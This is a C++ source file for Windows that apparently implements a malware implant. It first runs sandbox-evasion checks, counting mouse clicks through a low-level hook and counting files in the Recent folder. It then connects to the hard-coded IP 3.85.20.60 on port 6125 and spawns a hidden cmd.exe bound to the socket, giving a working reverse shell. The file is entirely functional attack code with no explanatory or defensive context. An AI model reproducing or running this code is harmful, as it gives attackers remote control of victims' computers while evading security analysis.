#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCKAPI_    // Prevent inclusion of winsock.h in windows.h

#include <winsock2.h>
#include <Windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <shellscalingapi.h>
#include <shlobj.h>

// System Headers
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>
#include <TlHelp32.h>
#include <psapi.h>

// Standard C/C++ Headers
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <time.h>
#include <io.h>
#include <strsafe.h>

// Library Links
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shcore.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")


using namespace std;

DWORD g_dwMouseClicks = 0x00;
HHOOK g_hMouseHook = 0x00;
DWORD g_dwLastPrintTime = 0;
LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN)
    {
        g_dwMouseClicks++;
        printf("Mouse clicks: %d\n", g_dwMouseClicks);

        if (g_dwMouseClicks >= 5)
        {

            UnhookWindowsHookEx(g_hMouseHook);
            PostQuitMessage(0); 
        }
    }

    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL IsVirtualEnvUserInteraction(IN DWORD dwMonitorTimeInSec, IN OPTIONAL DWORD dwNmbrOfMouseClicks)
{
    DWORD dwMouseClicks = 5; 

    if (!dwMonitorTimeInSec)
        return true;

    if (dwNmbrOfMouseClicks && dwNmbrOfMouseClicks > 1)
        dwMouseClicks = dwNmbrOfMouseClicks;

    g_dwMouseClicks = 0;

    if (!(g_hMouseHook = SetWindowsHookExW(WH_MOUSE_LL, (HOOKPROC)HookProc, NULL, 0)))
    {
        printf("[!] SetWindowsHookExW Failed With Error: %d \n", GetLastError());
        return false;
    }

    MSG Msg;
    DWORD startTime = GetTickCount();
    while (GetTickCount() - startTime <= dwMonitorTimeInSec * 1000)
    {
        if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&Msg);
            DispatchMessage(&Msg);
        }

        if (g_dwMouseClicks >= dwMouseClicks)
        {
            UnhookWindowsHookEx(g_hMouseHook);
            return true; 
        }
    }

    UnhookWindowsHookEx(g_hMouseHook);
    return false; 
}


bool CheckRecentFiles()
{
    PWSTR recentFolder = NULL;
    SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &recentFolder);
    wchar_t recentFolderFiles[MAX_PATH + 1] = L"";
    StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
    StringCbCatW(recentFolderFiles, MAX_PATH, L"\\*");
    int numberOfRecentFiles = 0;
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(recentFolderFiles, &findFileData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            numberOfRecentFiles++;
        } while (FindNextFileW(hFind, &findFileData));
        FindClose(hFind);
    }
    CoTaskMemFree(recentFolder);
    if (numberOfRecentFiles >= 2)
        numberOfRecentFiles -= 2; 
    return numberOfRecentFiles >= 20;
}

bool isSafeEnvironment()
{
    return IsVirtualEnvUserInteraction(60, 5) && CheckRecentFiles();
}

int main(int argc, char *argv[])
{
    if (!isSafeEnvironment())
    {
        Sleep(15000);
        return 1;
    }
    string ip = "3.85.20.60";
    short port = 6125;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        return 1;
    }

    SOCKET WSock;
    WSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, (unsigned int)nullptr, (unsigned int)nullptr);

    struct sockaddr_in hax;
    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip.c_str());

    if (WSAConnect(WSock, (SOCKADDR *)&hax, sizeof(hax), nullptr, nullptr, nullptr, nullptr) != 0)
    {
        closesocket(WSock);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)WSock;
    sui.wShowWindow = SW_HIDE;

    string process = "cmd.exe";
    if (CreateProcessA(nullptr, (LPSTR)process.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &sui, &pi))
    {
        HWND hWnd = FindWindowA("ConsoleWindowClass", nullptr);
        if (hWnd != nullptr) {
            PostMessage(hWnd, WM_CLOSE, 0, 0);
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(WSock);
    WSACleanup();

    return 0;
}
